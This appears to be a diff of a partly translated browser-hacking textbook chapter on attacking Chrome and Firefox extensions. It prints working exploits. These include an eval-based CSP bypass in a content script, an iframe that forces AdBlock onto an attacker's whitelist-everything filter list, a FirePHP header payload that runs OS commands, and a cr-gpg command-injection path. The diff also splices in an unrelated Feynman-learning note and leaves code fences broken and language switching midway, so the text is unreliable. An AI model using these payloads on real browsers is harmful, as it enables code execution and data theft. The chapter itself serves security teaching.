 对比 Figure 7-13 与 Figure 7-12，可以看出缺失的视觉提示非常细微。结合其他社交工程技术（如细微的通知窗口），可能足以误导受害者泄露 LastPass 凭据。随后，使用键盘记录器（如第 5 章所述）即可轻松获取这些凭据。这些凭据随后可用于访问受害者的 LastPass 账户，进而可能打开其所有密码的大门。
 
@@ -8151,13 +8147,10 @@ LastPass 是一种选项，也是目前可用的更流行的在线密码管理�
 
 在 Firefox 扩展中，可以通过搜索以下函数来寻找此类漏洞：
 
-*   `window.open()` 
-
-*   `window.opendialog()`
-
-*   `nsIWindowWatcher()`
-
-*   `XMLHTTPRequest()`
+* `window.open()`
+* `window.opendialog()`
+* `nsIWindowWatcher()`
+* `XMLHTTPRequest()`
 
 如果这些函数从 chrome:// 区域以不受信任的用户输入调用，你很可能已经发现了漏洞。这可能让你能够注入危险的 JavaScript，具体取决于扩展如何使用数据以及你是否能够携带指令。
 
@@ -8166,7 +8159,7 @@ LastPass 是一种选项，也是目前可用的更流行的在线密码管理�
 但请记住，有求必应。下面（经编辑）的代码来自 Stack Overflow33 论坛讨论：
 
 ```
- function loadInsecureScript(url) {
+function loadInsecureScript(url) {
   var x = new XMLHttpRequest();
   x.onload = function() {
     eval(x.responseText); // <-- Security Hole
@@ -8174,11 +8167,10 @@ LastPass 是一种选项，也是目前可用的更流行的在线密码管理�
   x.open('GET', url);
   x.send();
 }
-
 loadInsecureScript('http://browservictim.com/insecure.js');
 ```
 
-论坛回复还指出，manifest.json 文件需要满足以下条件：
+论坛回复还指出，`manifest.json` 文件需要满足以下条件：
 
 ```
 "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'",
@@ -8198,24 +8190,21 @@ Amazon 1Button App Chrome 扩展 34 提供了一个良好的 MitM 漏洞示例�
 
 为实现远程配置而无需升级扩展代码，Amazon 决定通过包含特定 JavaScript 文件的内容脚本来配置扩展。在版本 3.2013.627.0 中，该扩展的实现机制是获取以下文件：
 
-*   `http://www.amazon.com/gp/bit/toolbar/3.0/toolbar/httpsdatalist.dat`
-
-*   `http://www.amazon.com/gp/bit/toolbar/3.0/toolbar/search_conf.js`
+* `http://www.amazon.com/gp/bit/toolbar/3.0/toolbar/httpsdatalist.dat`
+* `http://www.amazon.com/gp/bit/toolbar/3.0/toolbar/search_conf.js`
 
 你可能已经注意到它们是通过 HTTP 进行加载的，但更重要的在于后续分析。
 
 `httpsdatalist.dat` 文件定义了需要监控的 HTTPS 页面列表，其内容如下：
 
 ```
- [
+[
   "https:[/]{2}(www[0-9]?|encrypted).?google[.].*[/]"
 ]
 ```
 
+- [search_conf.js 文件描述了在访问网页后需要提取的元素，以便向 Alexa 报告。下面的代码片段将让你了解其中的情况：]
 
-
-
--   [search_conf.js 文件描述了在访问网页后需要提取的元素，以便向 Alexa 报告。下面的代码片段将让你了解其中的情况：]
 ```
 {
   "google" : {
@@ -8269,30 +8258,34 @@ Amazon 1Button App Chrome 扩展 34 提供了一个良好的 MitM 漏洞示例�
     ...
   },
   ...
+
+
+
 }
+
 ```
 
-The scraped website contents matching XPath expressions in the search_conf.js file are reported to [`widgets.alexa.com`](http://widgets.alexa.com). These are shown in the previous configuration content.
+The scraped website contents matching XPath expressions in the `search_conf.js` file are reported to [`widgets.alexa.com`](http://widgets.alexa.com). These are shown in the previous configuration content.
 
-Figure 7-14 is a screenshot showing mitmproxy35 intercepting the communication to [`widgets.alexa.com`](http://widgets.alexa.com).
+Figure 7-14 is a screenshot showing `mitmproxy35` intercepting the communication to [`widgets.alexa.com`](http://widgets.alexa.com).
 
- start figure 
+start figure
 
 **Figure 7-14:** Man-in-the-Middle traffic with the 1Button extension
 
 ![c07f014.tif](img/c07f014.png)
 
- end figure 
+end figure
 
 However, there’s another glaring vulnerability. Remember the configuration URLs? You will notice that they are fetched over HTTP and not HTTPS. This makes them vulnerable to a MitM attack too!
 
-Let’s say you use MitM techniques to replace httpsdatalist.dat with the following code:
+Let’s say you use MitM techniques to replace `httpsdatalist.dat` with the following code:
 
 ```
 ["https://"]
 ```
 
-You will also use the following code when middling the search_conf.js request:
+You will also use the following code when middling the `search_conf.js` request:
 
 ```
 {
@@ -8325,11 +8318,11 @@ Using this attack, the extension will report (to Alexa) the DOM node contents of
 
 ### Bypassing Web Application CSP
 
-There is one conspicuous Chrome extension component that misses out on CSP protection. The web application can employ CSP by including the HTTP header X-Content-Security-Policy in the response. The extension background page also has CSP by default. The component missing this protection is the content script.
+There is one conspicuous Chrome extension component that misses out on CSP protection. The web application can employ CSP by including the HTTP header `X-Content-Security-Policy` in the response. The extension background page also has CSP by default. The component missing this protection is the content script.
 
 That is right; the Chrome extension content script has no CSP protection at all. This makes for an obvious target to get around any pesky CSP restrictions implemented by the web application developers. Let’s explore how you can use this component to do your bidding.
 
-For this example, let’s use the http://content-security-policy.com origin. If you load the URL you can look at the headers related to CSP. These are shown in the following example:
+For this example, let’s use the `http://content-security-policy.com` origin. If you load the URL you can look at the headers related to CSP. These are shown in the following example:
 
 ```
 X-Content-Security-Policy: default-src 'self' www.google-analytics.com
@@ -8337,19 +8330,20 @@ X-Content-Security-Policy: default-src 'self' www.google-analytics.com
  object-src 'none'; media-src 'none'; frame-src 'none'; connect-src 'none';
 ```
 
-The first thing to note for this example is the absence of the unsafe-eval directive. This means that when you attack this origin, you can’t leverage the eval function (or its friends, as discussed in Chapter 3) to achieve your ends. Well, that is unless you have a vulnerability in one of your target’s content scripts.
+The first thing to note for this example is the absence of the `unsafe-eval` directive. This means that when you attack this origin, you can’t leverage the `eval` function (or its friends, as discussed in Chapter 3) to achieve your ends. Well, that is unless you have a vulnerability in one of your target’s content scripts.
 
 The following vulnerable content script is one you’ll use for this CSP bypass example:
 
 ```
 // Get bhh URL parameter
 var bhh = document.location.href.split('bhh=')[1];
+
 if (typeof bhh == 'string') {
   eval(bhh); // eval the parameter
 }
 ```
 
-It has the following manifest file that only uses content scripts in your target http://content-security-policy.com origin:
+It has the following manifest file that only uses content scripts in your target `http://content-security-policy.com` origin:
 
 ```
 {
@@ -8384,15 +8378,15 @@ http://content-security-policy.com/#bhh=
 eval(alert('Browser Hacker\'s Handbook'))
 ```
 
-When your target browser loads the preceding URL, it will circumvent the CSP. You will see that an eval is injected into the content script and runs your alert box within the origin. Figure 7-15 shows the returned CSP headers and the successful execution of the eval function.
+When your target browser loads the preceding URL, it will circumvent the CSP. You will see that an `eval` is injected into the content script and runs your alert box within the origin. Figure 7-15 shows the returned CSP headers and the successful execution of the `eval` function.
 
- start figure 
+start figure
 
 **Figure 7-15:** Website CSP Bypass in a Chrome Extension
 
 ![c07f015.eps](img/c07f015.png)
 
- end figure 
+end figure
 
 You have successfully bypassed the CSP set by a web application through a vulnerability in a Chrome extension. More specifically, you have exploited a vulnerability in a content script, which has no protection given to it by CSP.
 
@@ -8404,30 +8398,25 @@ A content script can operate in many ways, and there will be varying situations 
 
 Attacking an extension’s content scripts is very similar to exploiting classic DOM XSS. The good news here is you can reuse all your DOM XSS knowledge to exploit extensions.
 
-For successful exploitation, the content script needs to grab your data and use it within the privileged context. The exact place in the DOM will depend on the extension being targeted. However, the <title> element is usually a safe bet, because a lot of extensions fetch content from the <title> element.
+For successful exploitation, the content script needs to grab your data and use it within the privileged context. The exact place in the DOM will depend on the extension being targeted. However, the `<title>` element is usually a safe bet, because a lot of extensions fetch content from the `<title>` element.
 
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
 
-
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
-
-
 Figure 7-17 展示了脆弱的内容脚本如何将 XSS 漏洞引入浏览器查看的每个网页。
 
- start figure 
+start figure
 
 **Figure 7-17:** SOP Extension 通用 XSS 在 Chrome 中
 
 ![c07f017.eps](img/c07f017.png)
 
- end figure 
+end figure
 
 Figure 7-17 指出了注入、弹出的提示框以及不包含漏洞的 HTTP 请求。你可以看到该漏洞的工作方式类似于 DOM XSS 漏洞，即通过在 URL 中使用 `#`，浏览器不会将该字符及其后的内容发送到 Web 服务器。将漏洞放在 `#` 之后，它不会出现在日志中，并可能不会被 Web 应用防火墙检测到。
 
@@ -8482,14 +8471,22 @@ chrome-extension://gighmmpiobklfepjocnamgkkbiglidom/pages/subscribe.html
 // 获取 URL
 var queryparts = parseUri.parseSearch(document.location.search);
 ...
-// 订阅列表
-var requiresList = queryparts.requiresLocation ?
-  "url:" + queryparts.requiresLocation : undefined;
-BGcall("subscribe",
-  {id: 'url:' + queryparts.location, requires:requiresList});
-```
 
+// 订阅列表
+
+
+
+`var requiresList = queryparts.requiresLocation ?`
+
+  `"url:" + queryparts.requiresLocation : undefined;`
+
+`BGcall("subscribe",`
+
+  `{id: 'url:' + queryparts.location, requires:requiresList});`
+
+```
 这段代码展示了导致漏洞的执行流程。第一行代码解析 URL 的查询部分并将其存储在 `queryparts` 变量中。最后一行代码订阅 AdBlock 到原本存储在 `location` 参数中的值。它可能是类似 `location=http://browserhacker.com` 的值，这将订阅来自 `http://browserhacker.com` 的过滤列表。因此，生成的完整 URL 如下：
+```
 
 ```
 chrome-extension://gighmmpiobklfepjocnamgkkbiglidom/pages
@@ -8501,11 +8498,17 @@ http://browserhacker.com
 
 ```
 <iframe style="position:absolute;left:-1000px;" id="bhh" src=""></iframe>
+
 //...
+
 var url = "chrome-extension://";
+
 url += "gighmmpiobklfepjocnamgkkbiglidom";
+
 url += "/pages/subscribe.html?";
+
 url += "location=http://browserhacker.com/list.txt";
+
 document.getElementById('bhh').src = url;
 ```
 
@@ -8515,6 +8518,7 @@ document.getElementById('bhh').src = url;
 
 ```
 [Adblock Plus 0.7.5]
+
 @@*$document,domain=~whitelist.all
 ```
 
@@ -8533,32 +8537,29 @@ AdBlock 2.6.4 版本的 manifest 并不包含 `subscribe.html` 字符串在 `web
 
 ### 攻击 DOM 事件处理程序
 
-chrome:// 区域与 Firefox 浏览器的不受信任区域之间也可以通过 DOM 事件进行通信。扩展通常会在 chrome:// 区域设置一个事件监听器，等待从网页接收的输入。当事件被触发时，它会对接收到的信息执行所需的操作。
+`chrome://` 区域与 Firefox 浏览器的不受信任区域之间也可以通过 DOM 事件进行通信。扩展通常会在 `chrome://` 区域设置一个事件监听器，等待从网页接收的输入。当事件被触发时，它会对接收到的信息执行所需的操作。
 
-开发者需要验证与处理程序交互的内容是否经过授权。即使未经过授权，扩展可能仍允许脚本注入到 chrome:// 区域，从而绕过任何保护措施。
+开发者需要验证与处理程序交互的内容是否经过授权。即使未经过授权，扩展可能仍允许脚本注入到 `chrome://` 区域，从而绕过任何保护措施。
 
 #### 攻击拖放操作
 
 Firefox 通过多个事件处理程序支持拖放操作：`dragstart`、`dragenter`、`dragover`、`dragleave`、`drag`、`drop` 和 `dragend`。图片、文本、链接和 DOM 节点可以在页面内拖动，或在某些情况下直接拖入扩展。
 
-
-
-
-一个重要的注意事项是，当以这种方式拖动带有属性的 HTML 元素或 DOM 节点时，所有属性、属性和方法都会复制到新位置。这在元素被拖动到 chrome:// 区域时尤为重要。一个此前看似无害的图像，如果包含 JavaScript onLoad 处理器，一旦被拖动并放入受信任区域，就可以无限制地执行：
+一个重要的注意事项是，当以这种方式拖动带有属性的 HTML 元素或 DOM 节点时，所有属性、属性和方法都会复制到新位置。这在元素被拖动到 `chrome://` 区域时尤为重要。一个此前看似无害的图像，如果包含 JavaScript `onLoad` 处理器，一旦被拖动并放入受信任区域，就可以无限制地执行：
 
 ```
 <img src="http://browserhacker.com/exploit.gif" onload="your_javascript">
 ```
 
-例如，前面的图像标签会将图像加载到网页中，并在非受信任的浏览器上下文中执行 onload 代码。然后，如果你的受害者将图像拖动到 chrome:// 区域，onload 代码会再次执行。此时，当 DOM 事件处理程序运行 onload 函数时，它会拥有提升的权限。
+例如，前面的图像标签会将图像加载到网页中，并在非受信任的浏览器上下文中执行 `onload` 代码。然后，如果你的受害者将图像拖动到 `chrome://` 区域，`onload` 代码会再次执行。此时，当 DOM 事件处理程序运行 `onload` 函数时，它会拥有提升的权限。
 
-Nick Freeman 发现了 ScribeFire43 Firefox 扩展中非常相似的漏洞。该扩展允许用户从任意来源向博客发布内容。漏洞位于用户将图像（来自任意来源）拖动到 chrome:// 区域的方式上。正如之前的示例所示，ScribeFire 会让你将指令隐藏在 onload 函数中，从而在受信任上下文中执行。
+Nick Freeman 发现了 ScribeFire43 Firefox 扩展中非常相似的漏洞。该扩展允许用户从任意来源向博客发布内容。漏洞位于用户将图像（来自任意来源）拖动到 `chrome://` 区域的方式上。正如之前的示例所示，ScribeFire 会让你将指令隐藏在 `onload` 函数中，从而在受信任上下文中执行。
 
-利用 DOM 事件需要仔细检查扩展程序如何处理用户输入。最终目标与其他讨论的方法相同：在 chrome:// 区域获得任意 JavaScript 执行。
+利用 DOM 事件需要仔细检查扩展程序如何处理用户输入。最终目标与其他讨论的方法相同：在 `chrome://` 区域获得任意 JavaScript 执行。
 
 ### 实现操作系统命令执行
 
-一旦你拥有 XCS（Cross-Site Scripting）漏洞，就有可能利用它来执行任意操作系统命令。这意味着你可以将命令隐藏在 chrome:// 区域中，并以像在命令行中输入那样的方式执行它们。但在此之前，让我们先看一个在 Firefox 中启动操作系统命令的示例。
+一旦你拥有 XCS（Cross-Site Scripting）漏洞，就有可能利用它来执行任意操作系统命令。这意味着你可以将命令隐藏在 `chrome://` 区域中，并以像在命令行中输入那样的方式执行它们。但在此之前，让我们先看一个在 Firefox 中启动操作系统命令的示例。
 
 #### Firefox 远程命令执行示例
 
@@ -8586,13 +8587,13 @@ X-Wf-1-1-1-1: 29|["Browser Hacker's Handbook"]|
 
 你会注意到在头部中插入了字符串 "Browser Hacker's Handbook"。通过查看 Figure 7-18，可以看到该字符串在对话框中显示。这确认了这些头部确实是扩展程序的攻击面的一部分。
 
- start figure 
+start figure 
 
 **Figure 7-18:** FirePHP 显示服务器数据
 
 ![c07f018.tif](img/c07f018.png)
 
- end figure 
+end figure 
 
 现在，让我们深入了解 Eldar Marcussen 发现的扩展程序漏洞。该漏洞影响所有 FirePHP 版本，直至 0.7.1，可从 [`addons.mozilla.org/en-US/firefox/addon/firephp/versions`](https://addons.mozilla.org/en-US/firefox/addon/firephp/versions) 下载。你需要通过在 Extensions 标签页中的“安装附加组件从文件”选项进行安装。
 
@@ -8606,9 +8607,9 @@ xhr.send();
 console.log('Mouseover FirePHP array to finish')
 ```
 
-这段代码会向 http://browserhacker.com 发送一个 XHR 请求，模拟攻击受害者的机会。FirePHP 会在响应中查找关键头部，漏洞就位于此处。你需要关注的头部是 X-Wf-1-1-1-1，该头部在解析后会触发漏洞。这是你需要隐藏指令的头部。如果你能正确构造响应头部，你的操作系统命令将被执行。
+这段代码会向 `http://browserhacker.com` 发送一个 XHR 请求，模拟攻击受害者的机会。FirePHP 会在响应中查找关键头部，漏洞就位于此处。你需要关注的头部是 `X-Wf-1-1-1-1`，该头部在解析后会触发漏洞。这是你需要隐藏指令的头部。如果你能正确构造响应头部，你的操作系统命令将被执行。
 
-为了演示，你需要使用代理拦截 HTTP 通信，并将利用代码注入到响应中。只需使用你喜欢的实时代理，并添加识别为 X-Wf 的目标 FirePHP 头部即可。
+为了演示，你需要使用代理拦截 HTTP 通信，并将利用代码注入到响应中。只需使用你喜欢的实时代理，并添加识别为 `X-Wf` 的目标 FirePHP 头部即可。
 
 下面的头部会在 OSX 系统上启动计算器应用：
 
@@ -8629,31 +8630,31 @@ Library-FirePHPCore/0.3
 X-Wf-1-Structure-1: http://meta.firephp.org/Wildfire/Structure/FirePHP/Dump/0.1
 X-Wf-1-1-1-1: 476|{"RequestHeaders":{"1":"1","2":"2","3":"3","4":"4","5":"5",
 "6":"6","7":"7","8":"8","9":"9","UR<script>var lFile=Components.classes
-[\"@mozilla.org/file/
-local;1\"].createInstance
+["@mozilla.org/file/
+local;1"].createInstance
 (Components.interfaces.nsILocalFile);lFile.initWithPath
-(\"/Applications/Calculator.app/Contents/MacOS/Calculator\");var process=
-Components.classes[\"@mozilla.org/process/util;1\"]
+("/Applications/Calculator.app/Contents/MacOS/Calculator");var process=
+Components.classes["@mozilla.org/process/util;1"]
 .createInstance(Components.interfaces.nsIProcess);process.init(lFile);
 process.run(true,[],0);void(0);<\/script>":"PWND}}|
 ```
 
-这个漏洞还需要一个额外步骤。受害者需要将鼠标悬停在控制台的 Dump 行上，触发 Variable Viewer，从而利用扩展程序。这会运行 Calculator.app，结果如 Figure 7-19 所示。
+这个漏洞还需要一个额外步骤。受害者需要将鼠标悬停在控制台的 Dump 行上，触发 Variable Viewer，从而利用扩展程序。这会运行 `Calculator.app`，结果如 Figure 7-19 所示。
 
 在此示例中，攻击被隐藏在一个大的数组中，因此漏洞不会显示在控制台中。另一个优势是，字符串占用了更多的屏幕空间，增加了受害者不小心将鼠标悬停到它上方的可能性。
 
- start figure 
+start figure 
 
 **Figure 7-19:** FirePHP 在 OSX 上的利用
 
 ![c07f019.tif](img/c07f019.png)
 
- end figure 
+end figure 
 
-现在，你已经利用了 FirePHP 漏洞在 OSX 上。该扩展程序同样可以在 Windows 上被利用，通过修改长度并使用以下字符串作为 lFile.initWithPath 调用的参数：
+现在，你已经利用了 FirePHP 漏洞在 OSX 上。该扩展程序同样可以在 Windows 上被利用，通过修改长度并使用以下字符串作为 `lFile.initWithPath` 调用的参数：
 
 ```
-"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\calc.exe\"
+"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\calc.exe\\"
 ```
 
 这种漏洞在可以安装 Firefox 的任何操作系统上都几乎都很容易被利用。
@@ -8661,9 +8662,6 @@ process.run(true,[],0);void(0);<\/script>":"PWND}}|
 FirePHP 的开发者已经修复了该漏洞。你可以查看补丁：[`github.com/firephp/firephp-extension/commit/fccab466cd5f014c36082d76ae300f2cd612ba51`](https://github.com/firephp/firephp-extension/commit/fccab466cd5f014c36082d76ae300f2cd612ba51)。在代码中，你会看到多处未对攻击者可控内容进行编码或过滤的地方。
 
 ### 实现命令注入
-
-
-
 
 你会在服务器端脚本调用操作系统时熟悉 `cmd` 注入，在这种情况下你可以将数据隐藏进去，当服务器将你的数据作为参数使用时，它实际上会执行你传递的命令。
 
@@ -8691,7 +8689,7 @@ Kotowicz45 在 `cr-gpg` Chrome 扩展 0.7.4 alpha 版中发现了一个 `cmd` �
 $($(messageElement).children()[0]).html(tempMessage);
 ```
 
-这段代码在 http://mail.google.com/ 和 https://mail.google.com/ 虚拟源中引入了存储型 XSS 漏洞。也就是说，注入发生在扩展的内容脚本中。
+这段代码在 `http://mail.google.com/` 和 `https://mail.google.com/` 虚拟源中引入了存储型 XSS 漏洞。也就是说，注入发生在扩展的内容脚本中。
 
 这种漏洞不在 Web 应用层面。XSS 漏洞仅在使用 `cr-gpg` 扩展的 Chrome 浏览器中，在 Gmail 虚拟源下可被利用。
 
@@ -8707,26 +8705,47 @@ FB::variant gmailGPGAPI::encryptMessage(const FB::variant& recipients,
       const FB::variant& msg)
 {
   string tempFileLocation = m_tempPath + "errorMessage.txt";
-  string tempOutputLocation = m_tempPath + "outputMessage.txt";
-  string gpgFileLocation = "\""+m_appPath +"gpg.exe\" ";
+
+
+
+```cpp
+string tempOutputLocation = m_tempPath + "outputMessage.txt";
+
+string gpgFileLocation = "\""+m_appPath +"gpg.exe\" ";
+
 vector<string> peopleToSendTo = 
+
 recipients.convert_cast<vector<string> >();
-  string cmd = "c:\\windows\\system32\\cmd.exe /c ";
-  cmd.append(gpgFileLocation);
-  cmd.append("-e --armor");
-  cmd.append(" --trust-model=always");
-  for (unsigned int i = 0; i < peopleToSendTo.size(); i++) {
-    cmd.append(" -r");
+
+string cmd = "c:\\windows\\system32\\cmd.exe /c ";
+
+cmd.append(gpgFileLocation);
+
+cmd.append("-e --armor");
+
+cmd.append(" --trust-model=always");
+
+for (unsigned int i = 0; i < peopleToSendTo.size(); i++) {
+
+  cmd.append(" -r");
+
 cmd.append(peopleToSendTo.at(i));
-  }
-  cmd.append(" --output ");
-  cmd.append(tempOutputLocation);
-  cmd.append(" 2>");
-  cmd.append(tempFileLocation);
+
+}
+
+cmd.append(" --output ");
+
+cmd.append(tempOutputLocation);
+
+cmd.append(" 2>");
+
+cmd.append(tempFileLocation);
+
 sendMessageToCommand(cmd,msg.convert_cast<string>());
-  
+
   <snip>
-} 
+
+}
 ```
 
 这段代码包含一个 `cmd` 注入漏洞。仔细观察，你会发现收件人列表未进行过滤，随后被追加到 `cmd` 字符串中。该 `cmd` 字符串随后由操作系统执行。生成的命令行如下：
@@ -8748,9 +8767,7 @@ gpg -e --armor --trust-model=always -r <recipient> --output out.txt 2>err.txt
     return document.getElementById('plugin0');
   }
   var testSettings = function(){
-  
   };
-  
   chrome.extension.onRequest.addListener(
   function(request, sender, sendResponse) {
     var gpgPath = localStorage['gpgPath'];
@@ -8790,9 +8807,9 @@ gmailGPGAPI::gmailGPGAPI(const gmailGPGPtr& plugin,
 }
 ```
 
+
+
 让我们探索将这些问题串联起来发起 `cmd` 注入攻击的过程。以下代码是从公开发布的漏洞利用中改编的：51
-
-
 
 # 摘要
 
@@ -8806,7 +8823,7 @@ gmailGPGAPI::gmailGPGAPI(const gmailGPGPtr& plugin,
 
 # 问题
 
-Level1 **1.** 比较 Chrome 和 Firefox 扩展程序的安全模型。 **2.** 什么是有效的扩展程序指纹识别方法？ **3.** `chrome://` 区域是什么，为什么它是它重要的？ **4.** 内容安全策略 (CSP) 对浏览器扩展程序有何影响？ **5.** 同源策略 (SOP) 对浏览器扩展程序有何影响？ **6.** 如何在 Firefox 扩展程序中执行操作系统命令？ **7.** 如何在 Chrome 扩展程序中执行操作系统命令？ **8.** 内容脚本拥有哪些权限？ **9.** 背景页面拥有哪些权限？ **10.** Firefox 扩展程序拥有哪些权限？
+Level1 **1.** 比较 Chrome 和 Firefox 扩展程序的安全模型。 **2.** 什么是有效的扩展程序指纹识别方法？ **3.** `chrome://` 区域是什么，为什么它是它重要的？ **4.** 内容安全策略 `CSP` 对浏览器扩展程序有何影响？ **5.** 同源策略 `SOP` 对浏览器扩展程序有何影响？ **6.** 如何在 Firefox 扩展程序中执行操作系统命令？ **7.** 如何在 Chrome 扩展程序中执行操作系统命令？ **8.** 内容脚本拥有哪些权限？ **9.** 背景页面拥有哪些权限？ **10.** Firefox 扩展程序拥有哪些权限？
 
 /Level1
 
@@ -8835,9 +8852,6 @@ Level1 **1.** 比较 Chrome 和 Firefox 扩展程序的安全模型。 **2.** �
 10\. Adam Barth, Adrienne Porter Felt, Prateek Saxena, and Aaron Boodman. (2012). Protecting Browsers from Extension Vulnerabilities. Retrieved November 30, 2013 from [`www.cs.berkeley.edu/~afelt/secureextensions.pdf`](http://www.cs.berkeley.edu/~afelt/secureextensions.pdf)
 
 11\. Google. (2013). Google Chrome Webstore. Retrieved November 30, 2013 from [`chrome.google.com/webstore/category/extensions`](https://chrome.google.com/webstore/category/extensions)
-
-
-
 
 # References
 
@@ -8911,9 +8925,6 @@ Level1 **1.** 比较 Chrome 和 Firefox 扩展程序的安全模型。 **2.** �
 
 46. Thinkst. (2013). Cr-gpg. Retrieved November 30, 2013 from `http:/st.com/tools/cr-gpg/`
 
-
-
-
 47. Jameel Haffejee. (2011). Cr-gpg: content_script.js. Retrieved November 30, 2013 from [`https://github.com/RC1140/cr-gpg/blob/v0.7.4/chromeExtension/content_script.js#L29`](https://github.com/RC1140/cr-gpg/blob/v0.7.4/chromeExtension/content_script.js#L29)
 
 48. Jameel Haffejee. (2011). Cr-gpg: manifest.json. Retrieved November 30, 2013 from [`https://github.com/RC1140/cr-gpg/blob/v0.7.4/chromeExtension/manifest.json#L19`](https://github.com/RC1140/cr-gpg/blob/v0.7.4/chromeExtension/manifest.json#L19)
@@ -8924,9 +8935,9 @@ Level1 **1.** 比较 Chrome 和 Firefox 扩展程序的安全模型。 **2.** �
 
 51. Krzysztof Kotowicz. (2012). Cr-gpg exploit. Retrieved November 30, 2013 from [`https://github.com/koto/blog-kotowicz-net-examples/blob/master/chrome-addons/cr-gpg/exploit.js`](https://github.com/koto/blog-kotowicz-net-examples/blob/master/chrome-addons/cr-gpg/exploit.js)
 
-# *Chapter 8*
+# Chapter 8
 
-# *Attacking Plugins*
+# Attacking Plugins
 
 Although a web browser’s primary focus is on rendering web pages, there has always been a push to support other types of rich content like movies, or interactive content such as 3-D models. These capabilities may even require integration with other applications or programming languages, such as Microsoft Excel or Java, in an effort to provide rich interactive content and features. These additional functionalities aren’t necessarily something that browser vendors want to support natively, so they often provide a method for application developers to access these features through a plugin interface.
 
@@ -8962,7 +8973,7 @@ Plugins and extensions are similar in that they extend the functionality of the 
 
  end figure 
 
-Extensions are typically also functional across a wide range of pages, because they have extended some functionality of the browser as a whole. Plugins on the other hand, are designed to support a file format. They are invoked only when the browser encounters one of those files. This occurs when the file is embedded into a web page via the <object> or <embed> tags or when the browser receives a supported content type. The Content-Type references a MIME type, which indicates how the browser should handle the file.
+Extensions are typically also functional across a wide range of pages, because they have extended some functionality of the browser as a whole. Plugins on the other hand, are designed to support a file format. They are invoked only when the browser encounters one of those files. This occurs when the file is embedded into a web page via the `<object>` or `<embed>` tags or when the browser receives a supported content type. The Content-Type references a MIME type, which indicates how the browser should handle the file.
 
  start figure 
 
@@ -8980,16 +8991,20 @@ Plugins may have fewer features and reduced functionality than the full applicat
 
 Typically when applications are updated, if plugins are associated with the external application, the plugins are updated as well. This is what causes you to have to restart your browser while updates are being installed. Because they share the same codebase, the plugin would become unstable if the underlying code changed while it was loaded into the browser.
 
+- [前面提到的，插件在以下两种情况下会被调用：由 Web 服务器传递的 Content-Type 与 MIME 类型匹配，或通过 `<embed>` 或 `<object>` 标签实现。下面是一段示例代码，用于将 Flash 文件嵌入页面：]
 
-
-
--   [前面提到的，插件在以下两种情况下会被调用：由 Web 服务器传递的 Content-Type 与 MIME 类型匹配，或通过 `<embed>` 或 `<object>` 标签实现。下面是一段示例代码，用于将 Flash 文件嵌入页面：]
 ```
-<`object` data="flashdemo.swf" type="application/x-shockwave-flash">   
-<`param` name="bhh" value="true"> 
+```
+
+
+
+`<object` data="flashdemo.swf" type="application/x-shockwave-flash">   
+`<param` name="bhh" value="true"> 
 </`object`>
+
 ```
 [This sample code tells the browser to embed an object into the page. When the file is loaded, the content type is determined via MIME to be a Flash object. This tells the browser that it should load the object with the Flash plugin. Finally, it passes the bhh parameter into the Flash plugin.]
+```
 
 ### Click to Play
 
@@ -9001,7 +9016,7 @@ start feature
 
 * * *
 
-**Specifying a Particular Java Runtime in Firefox** If you believe that a hooked browser running Firefox has access to an older Java Runtime Environment (JRE), you can modify the type attribute within the `<embed>` tag and cause the applet to run using the older JRE. For instance, take the following example: 
+**Specifying a Particular Java Runtime in Firefox** If you believe that a hooked browser running Firefox has access to an older Java Runtime Environment (JRE), you can modify the type attribute within the `<embed>` tag and cause the applet to run using the older JRE. For instance, take the following example:
 
 ```
 <`embed` code="Malicious.class"
@@ -9010,7 +9025,7 @@ type="application/x-java-applet;version=1.6.0"
 pluginspage=”http”://java.sun.com/j2se/1.6.0/download.html />”
 ```
 
-In this instance, the Malicious.class applet will try to run with the JRE that supports the MIME type `application/x-java-applet;version=1.6.0`. If there’s a JRE with a version equal to or greater than the one specified, then it will execute the applet. Otherwise, it will direct the user to the URL specified in the pluginspage attribute. On the other hand, if you consider this example: 
+In this instance, the `Malicious.class` applet will try to run with the JRE that supports the MIME type `application/x-java-applet;version=1.6.0`. If there’s a JRE with a version equal to or greater than the one specified, then it will execute the applet. Otherwise, it will direct the user to the URL specified in the `pluginspage` attribute. On the other hand, if you consider this example:
 
 ```
 <`embed` code="Malicious.class"
@@ -9019,7 +9034,7 @@ type="application/x-java-applet;jpi-version=1.6.0_18"
 pluginspage="http://java.sun.com/j2se/1.6.0/download.html" />
 ```
 
-The Malicious.class applet will try to run with JRE version 1.6.0_18. If this is not possible, the user will be directed to the URL specified in the pluginspage attribute. These methods may assist you if you want to target a specific Java version that may be affected by a particular exploit or Click to Play vulnerability, some of which will be discussed later on in the Attacking Java section. 
+The `Malicious.class` applet will try to run with JRE version `1.6.0_18`. If this is not possible, the user will be directed to the URL specified in the `pluginspage` attribute. These methods may assist you if you want to target a specific Java version that may be affected by a particular exploit or Click to Play vulnerability, some of which will be discussed later on in the Attacking Java section.
 
 * * *
 
@@ -9043,9 +9058,9 @@ Before exploring how plugins are blocked, first you need to understand why plugi
 
 Plugins can be blocked either by a configuration applied to corporately managed computers, or by vendors themselves. Microsoft, for instance, has pushed out kill bits for certain vulnerable ActiveX plugins in the past as part of security patches to help prevent exploitation. Kill bits are registry entries that mark COM or ActiveX objects as non-loadable in the browser. Mozilla blocked older Java versions from users to help prevent exploitation as well. Many corporate environments also deploy their own ActiveX kill bits to disable plugins that could cause issues from third parties. An example is Adobe products that may not be easily patchable within the corporate environment.
 
-Apple joined the party of companies blocking plugins in early 2013 when it blocked Java 7 to protect users from a vulnerable version. To do this, Apple pushed a configuration file change to its antimalware software, Xprotect, to block the Java plugin. To view what’s blocked on your Mac, you can view the plist XML file at [/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/Xprotect.plist](http:///System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/Xprotect.plist).
